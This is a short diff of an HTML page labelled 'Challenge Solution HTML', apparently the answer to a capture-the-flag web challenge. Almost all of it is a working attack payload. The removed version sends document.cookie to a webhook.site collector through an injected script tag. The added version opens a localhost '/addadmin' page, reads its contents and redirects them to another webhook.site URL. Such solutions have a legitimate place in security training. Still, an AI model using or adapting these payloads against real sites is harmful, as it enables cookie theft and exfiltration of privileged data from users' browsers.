@@ -5,30 +5,13 @@
     Challenge Solution HTML
 </body>
 <script>
-    const jsonp = (opts = {}) => {
-        opts.url = `${opts.url}?callback=${opts.callback}`;
-
-        opts.url += `&flag=${document.cookie}`;
-
-        const script = document.createElement('script');
-        script.src = opts.url;
-
-        script.onload = () => {
-            document.body.removeChild(script);
-        }
-
-        document.body.appendChild(script);
-    };
+    let w = window.open('http://localhost:8000/addadmin');
 
 
-    jsonp({
-        url: 'https://webhook.site/e3ab22b6-1f71-4947-b427-635458e273a9/',
-        callback: 'getData'
-    });
-
-    function getData(data) {
-        console.log(data);
-    }
+    setTimeout(() => {
+        let content = w.document.body.innerHTML
+        window.location = 'https://webhook.site/0090b671-0c20-4d09-8c75-83e5fd16f4e4/?' + encodeURI(content)
+    }, 250)
 </script>
 
 </html>
